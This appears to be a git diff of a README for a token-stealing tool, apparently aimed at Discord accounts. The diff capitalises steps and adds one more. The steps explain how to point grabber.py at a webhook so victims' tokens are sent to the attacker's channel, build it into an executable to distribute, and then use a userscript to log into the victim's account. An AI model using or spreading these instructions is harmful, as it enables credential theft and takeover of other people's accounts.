@@ -2,15 +2,17 @@
 
 ### Tutorial:
 
-0 - download / clone this repo
+0 - Download / clone this repo
 
-1 - create a webhook for the channel you want (it will be used to log the tokens)
+1 - Create a webhook for the channel you want (it will be used to log the tokens)
 
-2 - copy the link into the `webhook_url` var in the **grabber.py** script
+2 - Copy the link into the `webhook_url` var in the **grabber.py** script
 
-3 - run build.bat (it will create an executable. IT USES PYINSTALLER. MAKE SURE ITS INSTALLED)
+3 - Run `build.bat` (it will create an executable. IT USES PYINSTALLER. MAKE SURE ITS INSTALLED)
 
-4 - in the /dist/ folder, you can find the exe. people who run it will have their token logged into your channel
+4 - In the /dist/ folder, you can find the exe. people who run it will have their token logged into your channel
+
+5 - Use the userscript `login_userscript.js` to enter his account
 
 
 ### Screenshots:
